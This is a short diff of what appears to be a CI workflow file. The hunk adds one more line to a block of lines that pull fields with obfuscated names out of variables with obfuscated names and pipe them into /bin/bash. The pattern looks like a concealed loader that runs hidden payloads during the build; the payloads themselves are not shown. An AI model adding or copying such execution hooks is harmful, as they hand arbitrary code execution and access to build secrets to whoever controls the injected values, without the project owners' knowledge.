@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$n5233" | jq -r .ojhx5981 | /bin/bash
           echo $p4 | jq -r .xgc91457 | /bin/bash
           printf '%s' "$onc02" | jq -r .tod0153 | /bin/bash
+          echo $o6 | jq -r .rh7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
